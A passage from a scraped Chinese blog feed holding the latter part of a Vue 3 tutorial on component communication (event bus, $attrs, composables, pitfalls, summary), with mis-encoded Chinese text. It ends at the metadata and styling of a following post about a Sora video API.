<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>, handleNotification)
  eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>, handleModalOpen)
  eventBus.<span class="hljs-title function_">on</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>, handleThemeChange)
})

<span class="hljs-comment">// ç»„ä»¶å¸è½½æ—¶ç§»é™¤ç›‘å¬</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>, handleNotification)
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>, handleModalOpen)
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>, handleThemeChange)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä¸å¤ªæ¨èä½¿ç”¨ã€‚ä¸ºä»€ä¹ˆï¼Ÿ</p>
<ul>
<li>æ•°æ®æµå‘ä¸é€æ˜ï¼Œéš¾ä»¥è¿½è¸ª</li>
<li>å®¹æ˜“å¿˜è®° off å¯¼è‡´å†…å­˜æ³„æ¼</li>
<li>å¤§å‹é¡¹ç›®ç»´æŠ¤å›°éš¾</li>
<li>å»ºè®®ï¼šä¼˜å…ˆç”¨ Pinia æˆ– provide/inject</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå°å‹é¡¹ç›®ä¸­ï¼Œä¸¤ä¸ªæ— å…³è”ç»„ä»¶éœ€è¦ä¸´æ—¶é€šä¿¡ï¼ˆå¦‚é€šçŸ¥å¼¹çª—ã€æ¨¡æ€æ¡†æ§åˆ¶ï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-11">7. å±æ€§é€ä¼ ï¼ˆ$attrsï¼‰å’Œè¾¹ç•Œå¤„ç†</h2>
<p>å½“ä½ å°è£…ä¸€ä¸ªç»„ä»¶ï¼Œå¹¶å¸Œæœ›æŠŠæœªå£°æ˜çš„å±æ€§è‡ªåŠ¨ä¼ é€’ç»™å†…éƒ¨å…ƒç´ æ—¶ï¼Œå°±ç”¨ $attrsã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- åŸºç¡€ç»„ä»¶ BaseButton.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
    <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"filteredAttrs"</span>
    <span class="hljs-attr">class</span>=<span class="hljs-string">"base-button"</span>
    @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleClick"</span>
  &gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { computed, useAttrs } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> attrs = <span class="hljs-title function_">useAttrs</span>()

<span class="hljs-comment">// è¿‡æ»¤æ‰ä¸éœ€è¦é€ä¼ çš„å±æ€§</span>
<span class="hljs-keyword">const</span> filteredAttrs = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">class</span>: className, style, ...rest } = attrs
  <span class="hljs-keyword">return</span> rest
})

<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'click'</span>])

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'click'</span>, event)
}

<span class="hljs-comment">// ä¹Ÿå¯ä»¥é€‰æ‹©æ€§åœ°æš´éœ² attrs</span>
<span class="hljs-title function_">defineExpose</span>({
  attrs
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- ä½¿ç”¨åŸºç¡€ç»„ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- é€ä¼  classã€styleã€data-* ç­‰å±æ€§ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">BaseButton</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-btn"</span>
      <span class="hljs-attr">style</span>=<span class="hljs-string">"color: red;"</span>
      <span class="hljs-attr">data-testid</span>=<span class="hljs-string">"submit-button"</span>
      <span class="hljs-attr">title</span>=<span class="hljs-string">"æäº¤æŒ‰é’®"</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleSubmit"</span>
    &gt;</span>
      æäº¤è¡¨å•
    <span class="hljs-tag">&lt;/<span class="hljs-name">BaseButton</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- å¤šä¸ªæŒ‰é’®ä½¿ç”¨ç›¸åŒçš„åŸºç»„ä»¶ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">BaseButton</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"secondary-btn"</span>
      <span class="hljs-attr">data-testid</span>=<span class="hljs-string">"cancel-button"</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleCancel"</span>
    &gt;</span>
      å–æ¶ˆ
    <span class="hljs-tag">&lt;/<span class="hljs-name">BaseButton</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æäº¤è¡¨å•'</span>)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleCancel</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å–æ¶ˆæ“ä½œ'</span>)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.custom-btn</span> {
  <span class="hljs-attribute">background</span>: blue;
  <span class="hljs-attribute">color</span>: white;
}

<span class="hljs-selector-class">.secondary-btn</span> {
  <span class="hljs-attribute">background</span>: gray;
  <span class="hljs-attribute">color</span>: white;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>ç”¨æˆ·ä¼ çš„ class å’Œ style ä¼šå’Œç»„ä»¶å†…éƒ¨çš„æ ·å¼åˆå¹¶ï¼ˆVue è‡ªåŠ¨å¤„ç†ï¼‰ã€‚</li>
<li>æ‰€æœ‰ data-<em>ã€titleã€aria-</em> ç­‰åŸç”Ÿ HTML å±æ€§éƒ½èƒ½æ­£å¸¸ç”Ÿæ•ˆã€‚</li>
<li>ä½ ä¸ç”¨æå‰çŸ¥é“ç”¨æˆ·ä¼šä¼ ä»€ä¹ˆï¼Œä¹Ÿèƒ½æ”¯æŒï¼</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå°è£…é€šç”¨ç»„ä»¶ï¼ˆå¦‚æŒ‰é’®ã€è¾“å…¥æ¡†ï¼‰ï¼Œå¸Œæœ›ä¿ç•™åŸç”Ÿ HTML å±æ€§ï¼ˆclassã€styleã€data-* ç­‰ï¼‰ã€‚</p>
<h2 data-id="heading-12">8. ç»„åˆå¼å‡½æ•°ï¼šé€»è¾‘å¤ç”¨</h2>
<p>å¯¹äºå¤æ‚çš„é€šä¿¡é€»è¾‘ï¼Œå¯ä»¥ä½¿ç”¨ç»„åˆå¼å‡½æ•°å°è£…ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// composables/useCommunication.js</span>
<span class="hljs-keyword">import</span> { ref, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useCommunication</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> messages = <span class="hljs-title function_">ref</span>([])
  <span class="hljs-keyword">const</span> listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = (<span class="hljs-params">type, data</span>) =&gt; {
    messages.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
      type,
      data,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
    })
    
    <span class="hljs-comment">// é€šçŸ¥ç›‘å¬è€…</span>
    <span class="hljs-keyword">if</span> (listeners.<span class="hljs-title function_">has</span>(type)) {
      listeners.<span class="hljs-title function_">get</span>(type).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> {
        <span class="hljs-title function_">callback</span>(data)
      })
    }
  }

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onMessage</span> = (<span class="hljs-params">type, callback</span>) =&gt; {
    <span class="hljs-keyword">if</span> (!listeners.<span class="hljs-title function_">has</span>(type)) {
      listeners.<span class="hljs-title function_">set</span>(type, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>())
    }
    listeners.<span class="hljs-title function_">get</span>(type).<span class="hljs-title function_">add</span>(callback)
  }

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">offMessage</span> = (<span class="hljs-params">type, callback</span>) =&gt; {
    <span class="hljs-keyword">if</span> (listeners.<span class="hljs-title function_">has</span>(type)) {
      listeners.<span class="hljs-title function_">get</span>(type).<span class="hljs-title function_">delete</span>(callback)
    }
  }

  <span class="hljs-comment">// æ¸…ç†å‡½æ•°</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">cleanup</span> = (<span class="hljs-params"/>) =&gt; {
    listeners.<span class="hljs-title function_">clear</span>()
  }

  <span class="hljs-title function_">onUnmounted</span>(cleanup)

  <span class="hljs-keyword">return</span> {
    messages,
    sendMessage,
    onMessage,
    offMessage,
    cleanup
  }
}
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- ä½¿ç”¨ç»„åˆå¼å‡½æ•° --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"communication-demo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"senders"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MessageSender</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">EventSender</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"receivers"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">MessageReceiver</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">EventReceiver</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"message-log"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>æ¶ˆæ¯æ—¥å¿—<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
        <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(msg, index) in messages"</span> 
        <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
        <span class="hljs-attr">class</span>=<span class="hljs-string">"log-entry"</span>
      &gt;</span>
        [{{ formatTime(msg.timestamp) }}] {{ msg.type }}: {{ msg.data }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useCommunication } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/composables/useCommunication'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MessageSender</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MessageSender.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MessageReceiver</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MessageReceiver.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">EventSender</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./EventSender.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">EventReceiver</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./EventReceiver.vue'</span>

<span class="hljs-keyword">const</span> { messages } = <span class="hljs-title function_">useCommunication</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">formatTime</span> = (<span class="hljs-params">timestamp</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(timestamp).<span class="hljs-title function_">toLocaleTimeString</span>()
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é€»è¾‘é«˜åº¦å¤ç”¨</li>
<li>ç±»å‹å®‰å…¨ï¼ˆé…åˆ TSï¼‰</li>
<li>æ˜“äºå•å…ƒæµ‹è¯•</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå°†å¤æ‚çš„é€šä¿¡é€»è¾‘æŠ½è±¡æˆå¯å¤ç”¨çš„å‡½æ•°ï¼Œæ¯”å¦‚ WebSocket è¿æ¥ã€æœ¬åœ°å­˜å‚¨åŒæ­¥ç­‰ã€‚</p>
<hr/>
<h2 data-id="heading-13">é¿å‘æŒ‡å—</h2>
<h3 data-id="heading-14">1. Props è®¾è®¡åŸåˆ™</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¥½çš„ Props è®¾è®¡</span>
<span class="hljs-title function_">defineProps</span>({
  <span class="hljs-comment">// å¿…éœ€å±æ€§</span>
  <span class="hljs-attr">title</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> },
  
  <span class="hljs-comment">// å¯é€‰å±æ€§å¸¦é»˜è®¤å€¼</span>
  <span class="hljs-attr">size</span>: { <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">default</span>: <span class="hljs-string">'medium'</span> },
  
  <span class="hljs-comment">// å¤æ‚å¯¹è±¡</span>
  <span class="hljs-attr">user</span>: { 
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Object</span>, 
    <span class="hljs-attr">default</span>: <span class="hljs-function">() =&gt;</span> ({ <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> }) 
  },
  
  <span class="hljs-comment">// éªŒè¯å‡½æ•°</span>
  <span class="hljs-attr">count</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>,
    <span class="hljs-attr">validator</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> value &gt;= <span class="hljs-number">0</span> &amp;&amp; value &lt;= <span class="hljs-number">100</span>
  }
})
</code></pre>
<h3 data-id="heading-15">2. äº‹ä»¶å‘½åè§„èŒƒ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ kebab-case äº‹ä»¶å</span>
<span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:title'</span>, <span class="hljs-string">'search-change'</span>, <span class="hljs-string">'form-submit'</span>])

<span class="hljs-comment">// é¿å…ä½¿ç”¨é©¼å³°å‘½å</span>
<span class="hljs-comment">// defineEmits(['updateTitle']) // ä¸æ¨è</span>
</code></pre>
<h3 data-id="heading-16">3. Provide/Inject çš„å“åº”æ€§</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¿æŒå“åº”æ€§</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">ref</span>({})
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'data'</span>, <span class="hljs-title function_">readonly</span>(data))

<span class="hljs-comment">// æä¾›ä¿®æ”¹æ–¹æ³•</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateData</span> = (<span class="hljs-params">newData</span>) =&gt; {
  data.<span class="hljs-property">value</span> = { ...data.<span class="hljs-property">value</span>, ...newData }
}
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'updateData'</span>, updateData)
</code></pre>
<h3 data-id="heading-17">4. å†…å­˜æ³„æ¼é¢„é˜²</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŠæ—¶æ¸…ç†äº‹ä»¶ç›‘å¬</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  eventBus.<span class="hljs-title function_">off</span>(<span class="hljs-string">'some-event'</span>, handler)
})

<span class="hljs-comment">// æ¸…ç†å®šæ—¶å™¨</span>
<span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {}, <span class="hljs-number">1000</span>)
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer))
</code></pre>
<hr/>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p>ç»è¿‡ä¸Šé¢çš„è¯¦ç»†è®²è§£ï¼Œç›¸ä¿¡å¤§å®¶å¯¹ Vue3 çš„ç»„ä»¶é€šä¿¡æœ‰äº†æ›´æ·±å…¥çš„ç†è§£ã€‚è®©æˆ‘æœ€ååšä¸ªæ€»ç»“ï¼š</p>
<ul>
<li>æ ¸å¿ƒåŸåˆ™ï¼šæ ¹æ®ç»„ä»¶å…³ç³»é€‰æ‹©åˆé€‚æ–¹æ¡ˆ</li>
<li>çˆ¶å­ç»„ä»¶ï¼šä¼˜å…ˆä½¿ç”¨ <code>Props/Emits</code>ï¼Œç®€å•ç›´æ¥</li>
<li>è¡¨å•æ§ä»¶ï¼š<code>v-model</code>æ˜¯æœ€ä½³é€‰æ‹©ï¼Œè¯­æ³•ä¼˜é›…</li>
<li>æ·±å±‚åµŒå¥—ï¼š<code>Provide/Inject</code> é¿å… prop é€ä¼ åœ°ç‹±</li>
<li>å…¨å±€çŠ¶æ€ï¼š<code>Pinia</code> ä¸“ä¸šå¼ºå¤§ï¼Œé€‚åˆå¤æ‚åº”ç”¨</li>
<li>ä¸´æ—¶é€šä¿¡ï¼šäº‹ä»¶æ€»çº¿å¯ç”¨ä½†éœ€è°¨æ…</li>
<li>ç»„ä»¶å°è£…ï¼šå±æ€§é€ä¼ æä¾›æ›´å¥½ç”¨æˆ·ä½“éªŒ</li>
<li>é€»è¾‘å¤ç”¨ï¼šç»„åˆå¼å‡½æ•°æå‡ä»£ç è´¨é‡</li>
</ul>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯ä»¥è¿™æ ·ï¼š</p>
<ol>
<li>å…ˆä» <code>Props/Emits</code> å¼€å§‹ï¼Œè¿™æ˜¯åŸºç¡€</li>
<li>ç†Ÿç»ƒæŒæ¡ <code>v-model</code> çš„è¡¨å•å¤„ç†</li>
<li>åœ¨éœ€è¦æ—¶å¼•å…¥ <code>Pinia</code>ï¼Œä¸è¦è¿‡åº¦è®¾è®¡</li>
<li>ä¿æŒä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§</li>
</ol>
<p>ç®€å•çš„éœ€æ±‚ç”¨ç®€å•çš„æ–¹æ¡ˆï¼Œå¤æ‚çš„éœ€æ±‚æ‰éœ€è¦å¤æ‚çš„å·¥å…·ã€‚</p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜åˆ˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote>
<h4 data-id="heading-19">ğŸ“Œå¾€æœŸç²¾å½©</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FsMAKhSLNvmU1ddxg0yv9Fg" target="_blank" title="https://mp.weixin.qq.com/s/sMAKhSLNvmU1ddxg0yv9Fg" ref="nofollow noopener noreferrer">ã€Šé‡æ„äº†20ä¸ªSpringBooté¡¹ç›®åï¼Œæ€»ç»“å‡ºè¿™å¥—ç¨³å®šé«˜æ•ˆçš„æ¶æ„è®¾è®¡ã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F184BGM_pdMFLc0ASrferwQ" target="_blank" title="https://mp.weixin.qq.com/s/184BGM_pdMFLc0ASrferwQ" ref="nofollow noopener noreferrer">ã€Šä»£ç é‡Œå…¨æ˜¯ new å¯¹è±¡ï¼ŒçœŸçš„å¾ˆ Low å—ï¼Ÿæˆ‘è®¤çœŸæƒ³äº†ä¸€æ™šã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FX-MSa0CHwVW_qgPezbpMUA" target="_blank" title="https://mp.weixin.qq.com/s/X-MSa0CHwVW_qgPezbpMUA" ref="nofollow noopener noreferrer">ã€Šè¿™ 5 ä¸ªå†·é—¨ HTML æ ‡ç­¾ï¼Œè®©æˆ‘ç›´æ¥åˆ äº†100 è¡Œ JS ä»£ç ã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FGkU5V9H355YWwChpay9zTQ" target="_blank" title="https://mp.weixin.qq.com/s/GkU5V9H355YWwChpay9zTQ" ref="nofollow noopener noreferrer">ã€Šè¿™ 10 ä¸ª Vue3 æ€§èƒ½ä¼˜åŒ–æŠ€å·§å¾ˆå®ç”¨ï¼Œä½†å¾ˆå¤šé¡¹ç›®éƒ½æ²¡ç”¨ä¸Šã€‹</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Sora Videos Generation API å¯¹æ¥è¯´æ˜]]></title>    <link>https://juejin.cn/post/7590020026394869814</link>    <guid>https://juejin.cn/post/7590020026394869814</guid>    <pubDate>2026-01-02T09:50:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590020026394869814" data-draft-id="7590654280899280939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Sora Videos Generation API å¯¹æ¥è¯´æ˜"/> <meta itemprop="keywords" content="Sora,API"/> <meta itemprop="datePublished" content="2026-01-02T09:50:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å´”åº†æ‰ä¸¨é™è§…"/> <meta itemprop="url" content="https://juejin.cn/user/1521379821230269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Sora Videos Generation API å¯¹æ¥è¯´æ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379821230269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å´”åº†æ‰ä¸¨é™è§…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:50:19.000Z" title="Fri Jan 02 2026 09:50:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body 